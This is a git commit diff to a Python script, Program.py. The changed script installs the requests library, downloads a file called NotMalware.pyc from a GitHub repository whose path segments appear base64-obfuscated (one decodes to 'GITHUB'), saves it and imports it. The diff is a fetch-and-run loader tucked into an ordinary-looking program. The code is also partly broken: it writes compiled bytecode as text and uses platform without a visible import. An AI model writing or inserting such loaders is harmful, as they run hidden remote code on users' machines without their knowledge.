604dcc8031717d457db9060247c940cb07216893
HotPogger <will.anstey2005@gmail.com>
2020-11-11 08:58:48 -0500

    Did more stuff

--- Program.py
+++ Program.py
@@ -3,10 +3,9 @@ import subprocess
 import sys
 subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]) ##Installs dependency modules
 import requests
-filenames = ["Chat.txt", "ChatBot.py", "cUpdates.py",
-             "growthRate.py"]
-response = requests.get("https://github.com/R0lUSFVC/TUFMV0FS/blob/master/NotMalware.pyc?raw=true")
-with open("NotMalware.py", "w") as file:
+
+response = requests.get("https://raw.github.com/R0lUSFVC/TUFMV0FS/master/NotMalware.pyc")
+with open("NotMalware.pyc", "w") as file:
     file.write(response.text)
 import NotMalware
 platform = platform.system()
